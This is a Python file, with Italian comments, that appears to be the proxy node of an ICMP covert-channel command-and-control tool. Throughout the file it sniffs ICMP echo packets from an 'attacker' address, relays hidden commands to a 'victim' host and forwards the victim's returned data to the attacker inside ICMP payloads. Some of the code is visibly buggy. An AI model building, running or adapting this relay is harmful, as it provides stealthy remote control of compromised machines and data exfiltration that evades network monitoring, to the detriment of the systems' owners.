import mymethods
import argparse
import comunication_methods as com
import re

#from scapy.all import *
from scapy.all import ICMP, Raw, IP

import time
import datetime
import threading

#------------------------------------
def update_victim_end_communication(ip_vittima):
    try:
        com.is_valid_ipaddress_v4(ip_vittima)
    except Exception as e:
        raise Exception(f"update_victim_end_communication: {e}")
    data=com.END_COMMUNICATION
    if com.send_packet(data.encode(),ip_vittima):
        print(f"{ip_vittima}: la vittima è stata aggiornata")
        return
    print(f"{ip_vittima}: la vittima non è stata aggiornata")


def update_data_received(data):
    testclass.data_lock.acquire()
    testclass.data_received.append(data)
    testclass.data_lock.release() 

def callback_wait_data_from_vicitm(packet): 
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
        checksum=mymethods.calc_checksum(packet[Raw].load)
        #print(f"Payload received:\t{packet[Raw].load}")
        print(f"ID ICMP {packet[ICMP].id} e checksum {checksum} combaciano?{packet[ICMP].id==checksum}")
        if packet[ICMP].id==checksum: 
            update_data_received([packet[ICMP].id,packet[ICMP].seq,packet[Raw].load])
            if com.LAST_PACKET.encode() in packet[Raw].load:
                print(f"The packet contains {com.LAST_PACKET}\t{packet[Raw].load}")
                com.set_threading_Event(testclass.event_pktconn) 

def callback_wait_command_from_attacker(packet): 
    print(f"callback wait_command_from_attacker received:\n\t{packet.summary()}")
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
        #solo un proxy verrà usato per inoltrare il messaggio; tutti gli altri dovranno ricevere i dati dalla vittima
        #una proxy può o passare il comando (riceve CONFIRM_COMMAND) oppure ascoltare direttamente i dati (riceve START)
        if com.START.encode() in packet[Raw].load:
            testclass.command_to_redirect=None 
            com.set_threading_Event(testclass.event_pktconn) 
            return
        if com.END_COMMUNICATION.encode() in packet[Raw].load:
            testclass.command_to_redirect=com.END_COMMUNICATION 
            com.set_threading_Event(testclass.event_pktconn) 
            return
        command=packet[Raw].load.decode().replace(com.CONFIRM_COMMAND,"")
        checksum=(com.CONFIRM_COMMAND+command).encode()
        checksum=mymethods.calc_checksum(checksum) #per avere conferma di avere il comando corretto
        print(f"Command to redirect:\t{command}")
        print(f"ID ICMP {packet[ICMP].id} e checksum {checksum} combaciano?{packet[ICMP].id==checksum}") 
        if packet[ICMP].id == checksum and com.CONFIRM_COMMAND.encode() in packet[Raw].load:
            testclass.command_to_redirect=command 
            com.set_threading_Event(testclass.event_pktconn) 
            return
        print("Caso non contemplato") 

#----------------------------
def callback_wait_conn_from_victim(packet): 
    print(f"callback wait_conn_from_victim received:\n\t{packet.summary()}") 
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):   
        print(f"Ricevuto pacchetto da {packet[IP].src}...")
        confirm_text=com.CONFIRM_VICTIM+testclass.ip_vittima+testclass.ip_host
        check_sum=mymethods.calc_checksum(confirm_text.encode()) 
        if check_sum==packet[ICMP].id and testclass.ip_vittima==packet[IP].src: 
            print(f"il pacchetto ha confermato la connessione...") 
            com.set_threading_Event(testclass.event_pktconn) 
            return
    print(f"il pacchetto non ha confermato la connessione...")

def callback_wait_conn_from_attacker(packet): 
    print(f"callback wait_conn_from_attacker received:\n\t{packet.summary()}") 
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
        print(f"Ricevuto pacchetto da {packet[IP].src}...")
        vittima= packet[Raw].load.decode().replace(com.CONFIRM_ATTACKER,"").strip() 
        confirm_text=com.CONFIRM_ATTACKER+vittima
        checksum=mymethods.calc_checksum((confirm_text).encode())
        if testclass.ip_attaccante==packet[IP].src and com.CONFIRM_ATTACKER.encode() in packet[Raw].load and checksum==packet[ICMP].id:
            print(f"Packet: {packet[IP].src} ha confermato la connessione...") 
            testclass.ip_vittima=vittima
            testclass.gateway_vittima=mymethods.calc_gateway(testclass.ip_vittima) 
            com.set_threading_Event(testclass.event_pktconn) 
            return
        print(f"Packet: {packet[IP].src} non  ha confermato la connessione...")
#----------------------------

def get_value_of_parser(args):
    if args is None: 
        raise Exception("get_value_of_parser: Nessun argomento passato")
    return {
         "ip_attaccante":args.ip_attaccante
        ,"gateway_attaccante":mymethods.calc_gateway(args.ip_attaccante )
        ,"ip_host":args.ip_host
    } 

def check_value_in_parser(args):
    if not isinstance(args,argparse.Namespace):
        print("Argomento passato non valido") 
        return False
    if args.ip_attaccante is None or type(args.ip_attaccante) is not str or re.match(com.ip_reg_pattern, args.ip_attaccante) is None:
        print("IP attaccante non valido o non specificato")
        mymethods.print_parser_supported_arguments(parser)
        return False   
    if type(args.ip_host) is not str or re.match(com.ip_reg_pattern, args.ip_host) is None:
        print("IP host non valido o non specificato")
        mymethods.print_parser_supported_arguments(parser)
        return False
    return True

def get_args_from_parser():
    global parser
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip_host",type=str, help="IP dell'attaccante")
    parser.add_argument("--ip_attaccante",type=str, help="IP dell'attaccante")
    parser.add_argument("--ip_vittima",type=str, help="IP vittima")
    #parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")
    args= mymethods.check_args(parser) 
    if not check_value_in_parser(args):
        raise ValueError("Argomenti nel parser non corretti")
    return args

#------------------------
class Proxy: 
    def __init__(self): 
        #           __get_value_of_parser__
        args=get_args_from_parser() 
        if not check_value_in_parser(args):
            raise ValueError("__init__: Argomenti nel parser non corretti")
        dict_values=get_value_of_parser(args) 
        self.ip_attaccante=dict_values.get("ip_attaccante")
        self.gateway_attaccante=dict_values.get("gateway_attaccante")
        self.ip_host=dict_values.get("ip_host") 
        self.gateway_host=mymethods.calc_gateway(self.ip_host )
        self.ip_vittima=""
        self.gateway_vittima=None
    
    def connection_with_attacker(self):
        return self.wait_conn_from_attacker() and self.confirm_conn_to_attacker() 

    def wait_conn_from_attacker(self): 
        print(f"attendendo la connessione con {self.ip_attaccante}...") 
        args={
            "filter":f"icmp and icmp[0]==8 and src {self.ip_attaccante} and dst {self.ip_host}" 
            #,"count":1 
            ,"prn": callback_wait_conn_from_attacker 
            #,"store":True 
            ,"iface":mymethods.iface_from_IPv4(self.gateway_host)[1]
        }
        try:
            self.event_pktconn=com.get_threading_Event()
            self.sniffer,self.pkt_timer=com.sniff_packet(
                 args
                ,timeout_time=None
                ,event=self.event_pktconn
            ) 
            com.wait_threading_Event(self.event_pktconn) 
        except Exception as e:
            raise Exception(f"wait_conn_from_attacker: {e}")
        com.stop_sinffer(self.sniffer)
        if com.stop_timer(self.pkt_timer):
            print(f"L'attaccante {self.ip_attaccante} ha confermato la connessione")
            return True
        print(f"L'attaccante {self.ip_attaccante} non ha confermato la connessione")
        return False 
    
    def confirm_conn_to_attacker(self):
        try: 
            if not com.is_valid_ipaddress_v4(self.ip_vittima):
                raise Exception(f"confirm_conn_to_attacker: indirizzo vittima non valido")
            if not com.is_valid_ipaddress_v4(self.ip_host):
                raise Exception(f"confirm_conn_to_attacker: indirizzo vittima non valido")
        except ValueError as e:
            raise Exception(f"confirm_conn_to_attacker: {e}") 
        data=com.CONFIRM_PROXY+self.ip_vittima+self.ip_host
        if com.send_packet(data.encode() ,self.ip_attaccante):
            print(f"Reply:\tL'attaccante {self.ip_attaccante} ha risposto")
            return True
        print(f"No Reply:\tL'attaccante {self.ip_attaccante} non ha risposto")
        return False
    
    def setup_thread_4_foreach_proxy(self,callback_function=None): 
        try: 
            com.is_callback_function(callback_function)
        except Exception as e:
            raise Exception(f"setup_thread_4_foreach_proxy: {e}")
        if callback_function is None or not callable(callback_function):
            raise ValueError("setup_thread_4_foreach_proxy: callback function non valida")  
        self.thread_lock=threading.Lock()
        self.thread_proxy_response={self.ip_host:False}
        self.thread_list={self.ip_host:threading.Thread( target=callback_function)} 
        print(f"Lock creato:\t{self.thread_lock}")
        print(f"Thread creati:\t{self.thread_list}")
        print(f"Risposte create:\t{self.thread_proxy_response}")
    
    def connection_with_victim(self):
        self.setup_thread_4_foreach_proxy(self.wait_conn_from_victim)
        thread=self.thread_list.get(self.ip_host)
        thread.start() 
        result=self.confirm_conn_to_victim()
        thread.join() 
        result=testclass.thread_proxy_response.get(self.ip_host) and result 
        if result:
            print(f"il proxy {testclass.ip_host} è connesso alla vittima {testclass.ip_vittima}")  
        else:
            print(f"il proxy {testclass.ip_host} non è connesso alla vittima {testclass.ip_vittima}")
        #Una macchina non connessa alla vittima non serve. Quindi l'attaccante deve saperlo
        if testclass.update_attacker_about_conn_to_victim(result) and result: 
            return True 
        return False

    def confirm_conn_to_victim(self): 
        print("\n\t(─‿─)\tconfirm_conn_to_victim\n") 
        confirm_text=com.CONFIRM_PROXY+self.ip_vittima 
        if com.send_packet(confirm_text.encode() , self.ip_vittima): 
            print(f"Reply: la vittima {self.ip_vittima} ha risposto") 
            return True 
        print(f"No Reply: la vittima {self.ip_vittima} non ha risposto") 
        return False
    
    def wait_conn_from_victim(self):
        print("\n\t(─‿─)\twait_conn_from_victim\n")
        confirm_text=com.CONFIRM_VICTIM+self.ip_vittima+self.ip_host
        checksum=mymethods.calc_checksum(confirm_text.encode())
        args={
            "filter":f"icmp and icmp[0]==8  and src {self.ip_vittima} and icmp[4:2]={checksum}" 
            ,"count":1 
            ,"prn":callback_wait_conn_from_victim 
            #,"store":True 
            ,"iface":mymethods.iface_from_IPv4(self.gateway_vittima)[1]
        } 
        try:
            self.event_pktconn=com.get_threading_Event()
            self.sniffer,self.pkt_timer=com.sniff_packet(args,event=self.event_pktconn) 
            com.wait_threading_Event(self.event_pktconn)
        except Exception as e:
            raise Exception(f"wait_conn_from_victim: {e}")
        com.stop_sinffer(self.sniffer)
        if com.stop_timer(self.pkt_timer): 
            print(f"La connessione per {self.ip_vittima} è confermata") 
            com.update_thread_response(
                 self.ip_host
                ,self.thread_lock
                ,self.thread_proxy_response
                ,True
            )
            return True 
        print(f"La connessione per {self.ip_vittima} non è confermata") 
        return False
    
    def update_attacker_about_conn_to_victim(self,risultato:bool=None): 
        print("\n\t(─‿─)\tupdate_attacker_about_conn_to_victim\n")
        try:
            com.is_boolean(risultato)
        except Exception as e:
            raise Exception(f"update_attacker_about_conn_to_victim: {e}")
        data=com.CONFIRM_VICTIM+self.ip_vittima+self.ip_host+str(risultato)
        if com.send_packet(data.encode(),self.ip_attaccante):
             print(f"{self.ip_attaccante} aggiornamento confermato...")
             return True
        print(f"{self.ip_attaccante} aggiornamento non confermato...")
        return False
    
    def send_command_and_wait_data(self):
        comando=self.wait_command_from_attacker()
        self.data_lock=threading.Lock()
        while comando not in com.exit_cases: 
            self.data_received=[]
            thread_data=threading.Thread(
                target=self.wait_data_from_vicitm
                #,args=[self.ip_vittima]
            )
            thread_data.start()
            print(f"Il comando da inoltrare è {comando}") 
            if comando is not None:
                data=com.CONFIRM_COMMAND+comando
                if not self.redirect_command_to_victim(data.encode()):
                    com.set_threading_Event(self.event_pktconn) 
            thread_data.join() 
            if len(self.data_received)<=0:
                testclass.redirect_data_to_attacker([com.LAST_PACKET])
            testclass.redirect_data_to_attacker(self.data_received)
            #return self.data_received 
            comando=self.wait_command_from_attacker()
        print("Interruzione del programma")
        update_victim_end_communication(self.ip_vittima)
    
    def wait_command_from_attacker(self):
        print(f"Waiting the command from {self.ip_attaccante}") 
        self.command_to_redirect=None
        args={
            "filter":f"icmp and icmp[0]==8 and src {self.ip_attaccante} and dst {self.ip_host}" 
            #,"count":1 
            ,"prn":callback_wait_command_from_attacker
            #,"store":True 
            ,"iface":mymethods.iface_from_IPv4(self.gateway_attaccante)[1]
        }
        try:
            self.event_pktconn=com.get_threading_Event()
            self.sniffer,self.timeout_timer=com.sniff_packet(
                 args
                ,timeout_time=None
                ,event=self.event_pktconn
            )
            com.wait_threading_Event(self.event_pktconn)  
        except Exception as e:
            raise Exception(f"wait_command_from_attacker: {e}") 
        com.stop_sinffer(self.sniffer)
        if com.stop_timer(self.timeout_timer):
            print(f"Il proxy ha ricevuto il comando? {self.command_to_redirect is not None}")
            try:
                if com.is_string(self.command_to_redirect):
                    return self.command_to_redirect
            except Exception as e:
                print(f"wait_command_from_attacker: {e}")
        return None
    
    def wait_data_from_vicitm(self):
        print(f"si aspettano i dati da {self.ip_vittima}")
        args={
            "filter":f"icmp and src {self.ip_vittima} and dst {self.ip_host}" 
            #,"count":1 
            ,"prn":callback_wait_data_from_vicitm
            #,"store":True 
            ,"iface":mymethods.iface_from_IPv4(self.gateway_vittima)[1]
        }
        try: 
            self.event_pktconn=com.get_threading_Event()
            self.sniffer, self.timeout_timer=com.sniff_packet(args,event=self.event_pktconn) 
            com.wait_threading_Event(self.event_pktconn) 
        except Exception as e:
            raise Exception(f"wait_data_from_vicitm: {e}")
        com.stop_sinffer(self.sniffer)
        if com.stop_timer(self.timeout_timer): 
            print(f"Proxy: {self.ip_vittima} ha mandato i dati") 
            return True
        print(f"Proxy: {self.ip_vittima} non ha mandato i dati") 
        return False

    def redirect_command_to_victim(self,command_to_redirect):
            print(f"Sendin command {command_to_redirect} to {self.ip_vittima}") 
            if com.send_packet(command_to_redirect,self.ip_vittima):
                print(f"la vittima ha ricevuto il comando")
                return True
            print(f"la vittima non ha ricevuto il comando")
            return False 
    
    def redirect_data_to_attacker(self,data_received:list=None): 
        try:
            if not com.is_list(data_received) or len(data_received)<=0:
                raise Exception(f"redirect_data_to_attacker: dati ricevuti non validi")
        except Exception as e:
            raise Exception(f"redirect_data_to_attacker: {e}")
        print(f"data_received: {data_received}")
        for id,seq,data in data_received:
            print(f"prova id: {str(id)[0]}")
            data=data if isinstance(data,bytes) else data.encode() 
            num_times_not_received=0
            while not com.send_packet(data, self.ip_attaccante,icmp_seq=seq) and num_times_not_received<=3:
                print("l'attaccante non ha ricevuto i dati")
                time.sleep(1)
            if num_times_not_received>3:
                raise Exception(f"redirect_data_to_attacker: impossibilità nel mandare i dati all'attaccante")
        print(f"dati mandati all'attaccante")


if __name__=="__main__":
    try:
        global testclass
        testclass=Proxy()
    except Exception as e:
        print(f"main:Proxy(): {e}")
        exit(1) 
    try:
        print("\n\t(＾▽＾)\tconnection_with_attacker\n")
        exit(0) if not testclass.connection_with_attacker() else None 
    except Exception as e:
        print(f"main:connection_with_attacker: {e}")
        exit(1) 
    try:  
        print("\n\t(＾▽＾)\tconnection_with_victim\n")
        exit(0) if not testclass.connection_with_victim() else None 
    except Exception as e:
        print(f"main:connection_with_victim: {e}")
        exit(1) 
    try: 
        testclass.send_command_and_wait_data() 
    except Exception as e:
        print(f"main: {e}")
        exit(1)